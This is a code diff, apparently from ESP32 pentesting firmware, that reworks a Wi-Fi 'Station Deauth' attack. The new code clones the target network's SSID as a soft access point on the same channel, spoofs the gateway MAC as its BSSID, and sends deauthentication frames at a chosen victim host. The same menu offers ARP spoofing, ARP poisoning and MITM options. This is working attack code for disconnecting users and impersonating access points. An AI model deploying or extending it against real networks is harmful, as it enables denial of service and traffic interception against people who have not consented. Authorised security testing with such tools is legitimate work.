@@ -102,13 +102,14 @@ void afterScanOptions(const Host& host) {
   #ifndef LITE_VERSION
     {"SSH Connect",     [=](){ ssh_setup(host.ip.toString()); }},
   #endif
-    {"Station Deauth",  [=](){ stationDeauth(host); }},
+    {"Station Deauth",  [&](){ opt=3; }},
     {"ARP Spoofing",    [=](){ arpSpoofing(host, false); }},
     {"ARP Poisoning",   [=](){ arpPoisoner(); }},
   };
   //if(sdcardMounted && bruceConfig.devMode) options.push_back({"ARP MITM (WIP)",  [&](){ opt=5;  }});
   loopOptions(options);
   delay(200);
+  if(opt==3) stationDeauth(host);
   if(opt==5)  { 
     Serial.println("Starting MITM");
     arpSpoofing(host, true);
@@ -421,11 +422,22 @@ void stationDeauth(Host host) {
   uint8_t gatewayMAC[6];
   uint8_t victimIP[4];
   for(int i=0;i<4;i++) victimIP[i]=host.ip[i];
-
-  esp_wifi_get_channel(&ap_record.primary, &ap_record.second);
-  memcpy(ap_record.bssid, WiFi.BSSID(), 6);
-
+  String tssid = WiFi.SSID();
+  int channel;
   getGatewayMAC(gatewayMAC);
+  esp_wifi_get_channel(&ap_record.primary, &ap_record.second);
+  channel = ap_record.primary;
+  //wifiDisconnect();
+  //delay(10);
+  WiFi.mode(WIFI_AP);
+  if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
+    Serial.println("Fail Starting AP Mode");
+    displayError("Fail starting Deauth",true);
+    return;    
+  }
+
+  memcpy(ap_record.bssid, gatewayMAC, 6);
+
   stringToMAC(host.mac.c_str(), MAC);
   
   // Prepare deauth frame for each AP record
@@ -455,5 +467,5 @@ void stationDeauth(Host host) {
   }
 
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-
+  wifiDisconnect();
 }
